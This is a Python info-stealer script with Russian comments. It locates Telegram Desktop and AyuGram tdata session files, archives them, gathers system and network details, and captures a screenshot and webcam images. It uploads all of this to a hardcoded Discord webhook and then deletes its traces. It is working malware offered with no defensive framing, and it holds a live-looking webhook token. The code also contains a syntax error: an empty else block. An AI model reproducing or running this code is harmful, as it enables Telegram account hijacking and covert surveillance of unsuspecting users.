import os
import zipfile
import requests
import cv2
import pyautogui
import platform
import socket
import psutil
import uuid
import re
from datetime import datetime
import getpass
import shutil
import json

# Конфигурация
WEBHOOK_URL = "https://discord.com/api/webhooks/1389283951436369941/H4uFr_KdfZ1YBqZENP3V5P8IqY3qkeIALlD7K41mNsjjFXuywRERfEvhkwjmjO3zID68"
TARGET_FILES = ["key_datas", "settingss", "usertag"]

def get_downloads_folder():
    """Возвращает путь к папке Загрузки"""
    return os.path.join(os.path.expanduser("~"), "Downloads")

def create_temp_folder():
    """Создает временную папку в Загрузках"""
    temp_folder = os.path.join(get_downloads_folder(), f"temp_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
    os.makedirs(temp_folder, exist_ok=True)
    return temp_folder

def find_tdata_folder():
    """Находит папку tdata"""
    username = getpass.getuser()
    paths = [
        f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata",
        f"C:\\Users\\{username}\\Documents\\Telegram Desktop\\tdata",
        "\\ayugram\\tdata",
        "C:\\Users\\Пользователь\\Desktop\\asdsdsa\\1AyuGram\\tdata"
    ]
    
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def get_system_info():
    """Собирает полную информацию о системе"""
    try:
        info = {
            "💻 Система": {
                "ОС": platform.system(),
                "Версия": platform.version(),
                "Архитектура": platform.architecture()[0],
                "Имя ПК": socket.gethostname(),
                "Пользователь": getpass.getuser(),
                "Дата/время": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            "⚙️ Аппаратное обеспечение": {
                "Процессор": platform.processor(),
                "Ядра (физ/лог)": f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)}",
                "ОЗУ": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "Диск (C:)": f"Использовано {psutil.disk_usage('C:').percent}%",
                "MAC-адрес": ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            },
            "🌐 Сеть": {
                "Локальный IP": socket.gethostbyname(socket.gethostname()),
                "Публичный IP": requests.get('https://api.ipify.org').text if requests.get('https://api.ipify.org').status_code == 200 else "Недоступен",
                "Интерфейсы": []
            }
        }

        # Добавляем сетевые интерфейсы
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info["🌐 Сеть"]["Интерфейсы"].append(f"{name}: {addr.address}")

        return json.dumps(info, indent=4, ensure_ascii=False)

    except Exception as e:
        return f"⚠️ Ошибка сбора информации: {str(e)}"

def archive_tdata_files(tdata_path, output_path):
    """Архивирует только целевые файлы из tdata"""
    zip_path = os.path.join(output_path, "tdata_backup.zip")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in TARGET_FILES:
            file_path = os.path.join(tdata_path, file)
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))
    
    return zip_path if os.path.exists(zip_path) else None

def take_screenshot(output_path):
    """Делает скриншот экрана"""
    try:
        screenshot_path = os.path.join(output_path, "screenshot.png")
        pyautogui.screenshot(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"⚠️ Ошибка скриншота: {str(e)}")
        return None

def take_camera_shots(output_path):
    """Делает снимки с доступных камер"""
    camera_files = []
    for i in range(3):  # Проверяем первые 3 камеры
        try:
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    cam_path = os.path.join(output_path, f"camera_{i}.jpg")
                    cv2.imwrite(cam_path, frame)
                    camera_files.append(cam_path)
            cap.release()
        except Exception as e:
            print(f"⚠️ Ошибка камеры {i}: {str(e)}")
    return camera_files

def send_to_discord(webhook_url, files, message):
    """Отправляет файлы в Discord"""
    try:
        # Добавляем время отправки
        send_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_message = f"**📊 Полный отчёт о системе**\n```json\n{message}\n```\n**🕒 Время отправки:** `{send_time}`"
        
        # Отправляем сообщение
        requests.post(webhook_url, json={"content": full_message})
        
        # Отправляем файлы
        for file in files:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    requests.post(webhook_url, files={'file': (os.path.basename(file), f)})
        return True
    except Exception as e:
        return False

def cleanup(folder):
    """Удаляет временную папку"""
    try:
        shutil.rmtree(folder)
    except Exception as e:
        print(f"⚠️ Ошибка очистки: {str(e)}")

def main():
    tdata_path = find_tdata_folder()
    
    # Создаем временную папку в Загрузках
    temp_folder = create_temp_folder()
    
    # 1. Собираем информацию о системе
    system_info = get_system_info()
    info_file = os.path.join(temp_folder, "system_info.json")
    with open(info_file, 'w', encoding='utf-8') as f:
        f.write(system_info)
    
    # 2. Архивируем tdata файлы (если найдены)
    zip_path = None
    if tdata_path:
        zip_path = archive_tdata_files(tdata_path, temp_folder)
    else:
    
    # 3. Делаем скриншот
    screenshot_path = take_screenshot(temp_folder)
    
    # 4. Снимки с камер
    camera_files = take_camera_shots(temp_folder)
    
    # Собираем все файлы для отправки
    files_to_send = [info_file]
    if zip_path: files_to_send.append(zip_path)
    if screenshot_path: files_to_send.append(screenshot_path)
    files_to_send.extend(camera_files)
    
    # Отправляем в Discord
    if send_to_discord(WEBHOOK_URL, files_to_send, system_info):
        # Удаляем временные файлы после успешной отправки
        cleanup(temp_folder)

if __name__ == "__main__":
    main()